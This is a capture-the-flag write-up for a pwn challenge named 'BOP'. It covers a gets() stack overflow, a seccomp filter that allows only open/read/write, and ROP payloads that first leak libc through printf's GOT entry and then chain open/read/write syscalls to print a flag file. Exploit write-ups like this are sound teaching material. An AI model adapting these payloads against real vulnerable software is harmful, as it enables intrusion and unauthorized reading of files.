# BOP
This is write-up for BOP.

The source code of main is as follows:
```
__int64 __fastcall main(int a1, char **a2, char **a3)
{
  char v4[32]; // [rsp+0h] [rbp-20h] BYREF

  setbuf(stdin, 0LL);
  setbuf(stdout, 0LL);
  setbuf(stderr, 0LL);
  printf("Do you bop? ");
  return gets(v4);
}
```

The last line of main calls gets to receive inputs to a buffer and returns using gets' return value.

Running checksec gives:
```    
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
And we can verify that the binary uses seccomp tools:
```
# seccomp-tools dump ./bop                                                                                   [±PIE ●]
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x09 0xc000003e  if (A != ARCH_X86_64) goto 0011
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x06 0xffffffff  if (A != 0xffffffff) goto 0011
 0005: 0x15 0x04 0x00 0x00000000  if (A == read) goto 0010
 0006: 0x15 0x03 0x00 0x00000001  if (A == write) goto 0010
 0007: 0x15 0x02 0x00 0x00000002  if (A == open) goto 0010
 0008: 0x15 0x01 0x00 0x0000003c  if (A == exit) goto 0010
 0009: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0011
 0010: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0011: 0x06 0x00 0x00 0x00000000  return KILL
 ```

## Attack Plan
We can control the return address and perform ORW (Open Read Write) using ROP.
I've done ORW from [pwnable.tw](https://pwnable.tw/challenge/#2) using shellcoding but it was my first time using ROP, but the logic remains the same. It's just a matter of syntax.
## Pre-requisite
To perform ROP, we need to leak the libc base.
The GOT does not import puts, so I'll use printf.
The ROP payload to leak GOT entry of printf is as follows:
```
payload = b"A"*40 # offset
payload += p64(ret)
payload += p64(ret)
payload += p64(rdi)             # 1st parameter
payload += p64(e.got['printf'])
payload += p64(rsi)             # 2nd parameter (two pops)
payload += p64(e.got['printf'])
payload += p64(e.got['printf'])
payload += p64(e.plt['printf']) # call printf_plt
payload += p64(ret)
payload += p64(main) # return to main
```
The first two rets are to align bytes. 0 or 1 ret doesn't work (idk why).
The pop_rsi gadget I found pops to two registers, so I included two printf_got entries after pop_rsi.

## ORW
Using the leaked libc base, we can find other useful gadgets like pop_rax, pop_rdx, and syscall.

note: *make sure to find the stable syscall instruction, like read+0x10.*

We can run ROP again but now invoking ORW.
To store the contents of the file read, I'll use bss+0x800 (no special reason).

The payload is as follows:
```
"""OPEN"""
payload = b"A"*40
payload += p64(rdi) + p64(bss+0x800)
payload += p64(e.plt["gets"])
payload += p64(rdi)+p64(bss+0x800)
payload += p64(rsi) + p64(0) + p64(0)
payload += p64(rdx) + p64(0) 
payload += p64(rax) + p64(2)
payload += p64(syscall)

"""READ"""
payload += p64(rdi)+p64(3)
payload += p64(rsi)+p64(bss+0x800) + p64(0)
payload += p64(rax)+p64(0) 
payload += p64(rdx)+p64(0xff) 
payload += p64(syscall)

"""WRITE"""
payload += p64(rdi)+p64(1)
payload += p64(rsi)+p64(bss+0x800) + p64(0)
payload += p64(rax)+p64(1) 
payload += p64(rdx)+p64(0xff)
payload += p64(syscall)
```

We follow the standard [x64 syscall convention](https://syscalls64.paolostivanin.com/) to set the parameters of each component of ORW.

* set rdi to bss to store user input
* call gets
After user sends an input, it will be stored in BSS, in this case it will be "./flag.txt".
* set rdi to bss again
* set rsi (two pops) and rdx to 0
* set rax to 2
* syscall

Similar procedures are performed for Open and Write syscalls.
note: *cross compare with x64 syscall chart!*

### End
Then I send the payload along with "./flag.txt" and receive the output to get the flag.

